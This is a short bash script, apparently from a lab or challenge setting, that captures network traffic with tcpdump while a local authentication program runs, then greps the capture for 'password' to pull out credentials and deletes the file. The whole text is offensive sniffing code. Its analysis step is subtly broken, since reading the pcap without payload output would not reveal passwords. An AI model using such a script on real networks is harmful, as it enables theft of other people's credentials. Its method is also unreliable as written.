#!/bin/bash

# This script will sniff unencrypted traffic using tcpdump
# and extract sensitive information (e.g., passwords).

# Step 1: Run tcpdump to capture traffic
echo "Starting tcpdump to capture traffic..."
sudo tcpdump -i eth0 -w captured_traffic.pcap &

# Step 2: Run the user_authenticating_into_server script
echo "Running user_authenticating_into_server script..."
./user_authenticating_into_server

# Step 3: Stop tcpdump
echo "Stopping tcpdump..."
sudo pkill tcpdump

# Step 4: Analyze the captured traffic
echo "Analyzing captured traffic..."
tcpdump -nn -r captured_traffic.pcap | grep "password"

# Step 5: Clean up
rm captured_traffic.pcap
